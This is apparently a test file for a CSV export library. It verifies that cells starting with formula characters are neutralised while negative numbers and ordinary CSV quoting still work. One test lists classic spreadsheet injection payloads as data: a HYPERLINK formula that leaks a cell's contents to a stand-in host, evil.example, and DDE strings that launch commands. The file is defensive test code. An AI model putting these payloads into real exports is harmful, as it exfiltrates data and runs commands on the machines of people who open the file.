/**
 * CSV formula injection.
 *
 * Quoting makes a value survive the CSV grammar and says nothing about what a
 * spreadsheet does after parsing it. A cell beginning `=`, `+`, `-`, `@` or a
 * leading tab/CR is evaluated as a formula on open — so ordinary data, written
 * through the ordinary API, executes in the spreadsheet of whoever exports it.
 */

import { describe, expect, it } from 'bun:test';
import { csvCell, recordsToCsv } from '../../lib/security/csv.js';

describe('formula neutralisation', () => {
  it('defuses the classic payloads', () => {
    for (const payload of [
      '=HYPERLINK("https://evil.example/?"&A1,"Click")',
      "=cmd|'/c calc'!A1",
      '+1+1',
      "@SUM(1+1)*cmd|' /C calc'!A0",
      "-2+3+cmd|' /C calc'!A0",
    ]) {
      const cell = csvCell(payload);
      // The quote prefix is what makes a spreadsheet treat the cell as text.
      expect(cell.startsWith('"\'')).toBe(true);
      expect(cell).toContain(payload.replace(/"/g, '""'));
    }
  });

  it('defuses leading tab and carriage return', () => {
    // Both are formula-start characters in Excel once the cell is parsed.
    expect(csvCell('\t=1+1').startsWith('"\'')).toBe(true);
    expect(csvCell('\r=1+1').startsWith('"\'')).toBe(true);
  });

  it('leaves ordinary text untouched', () => {
    expect(csvCell('Ana Popescu')).toBe('"Ana Popescu"');
    expect(csvCell('a=b')).toBe('"a=b"'); // only a LEADING = starts a formula
  });
});

describe('numbers stay numbers', () => {
  it('does not prefix a negative number', () => {
    // The reason `-` needs care rather than a blanket prefix: mangling every
    // value starting with `-` would turn a column of amounts into text.
    for (const n of ['-42', '-3.5', '+2', '-1e9', '-0.5e-3']) {
      expect(csvCell(n)).toBe(`"${n}"`);
    }
  });

  it('does prefix something that only looks numeric', () => {
    expect(csvCell('-42=1+1').startsWith('"\'')).toBe(true);
    expect(csvCell('-1-2-cmd').startsWith('"\'')).toBe(true);
  });

  it('handles real numeric values', () => {
    expect(csvCell(-42)).toBe('"-42"');
    expect(csvCell(0)).toBe('"0"');
  });
});

describe('CSV grammar is still respected', () => {
  it('escapes embedded quotes', () => {
    expect(csvCell('she said "hi"')).toBe('"she said ""hi"""');
  });

  it('renders null and undefined as an empty cell', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it('renders a Date as ISO, not as a re-quoted JSON string', () => {
    // JSON.stringify(date) returns an ALREADY-quoted string; re-quoting it
    // yields """2026-…""" — valid CSV, garbled timestamp.
    const d = new Date('2026-07-31T10:00:00.000Z');
    expect(csvCell(d)).toBe('"2026-07-31T10:00:00.000Z"');
  });

  it('JSON-encodes objects', () => {
    expect(csvCell({ a: 1 })).toBe('"{""a"":1}"');
  });
});

describe('recordsToCsv', () => {
  it('neutralises formulas in both headers and cells', () => {
    const csv = recordsToCsv([{ '=evil()': '=alsoEvil()' }]);
    const [header, row] = csv.split('\r\n');
    expect(header.startsWith('"\'')).toBe(true);
    expect(row.startsWith('"\'')).toBe(true);
  });

  it('includes columns that only later rows have', () => {
    // Taking Object.keys(records[0]) drops columns whenever rows are ragged —
    // which they are the moment a collection gains a field.
    const csv = recordsToCsv([{ a: 1 }, { a: 2, b: 3 }]);
    expect(csv.split('\r\n')[0]).toBe('"a","b"');
    expect(csv.split('\r\n')[2]).toBe('"2","3"');
  });

  it('leaves a missing value as an empty cell', () => {
    const csv = recordsToCsv([{ a: 1, b: 2 }, { a: 3 }]);
    expect(csv.split('\r\n')[2]).toBe('"3",""');
  });

  it('returns an empty string for no rows', () => {
    expect(recordsToCsv([])).toBe('');
  });
});
